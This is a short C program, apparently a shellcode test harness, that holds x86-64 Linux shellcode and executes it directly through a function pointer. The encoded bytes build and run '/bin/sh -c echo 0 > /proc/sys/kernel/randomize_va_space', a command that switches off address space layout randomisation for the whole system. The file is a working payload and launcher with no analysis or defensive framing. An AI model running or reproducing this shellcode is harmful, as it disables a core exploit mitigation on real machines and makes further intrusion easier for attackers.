#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xc9\x89\xc8\x51\x66\x51\x68\x70\x61\x63\x65\x49\xb9\x69\x7a\x65\x5f\x76\x61\x5f\x73\x41\x51\x49\xb9\x6c\x2f\x72\x61\x6e\x64\x6f\x6d\x41\x51\x49\xb9\x79\x73\x2f\x6b\x65\x72\x6e\x65\x41\x51\x49\xb9\x20\x2f\x70\x72\x6f\x63\x2f\x73\x41\x51\x49\xb9\x65\x63\x68\x6f\x20\x30\x20\x3e\x41\x51\x49\x89\xe1\x66\x51\x66\x68\x2d\x63\x49\x89\xe0\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x48\x89\xe7\x51\x5a\x52\x41\x51\x41\x50\x57\x48\x89\xe6\x04\x3b\x0f\x05";


int main()

{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}


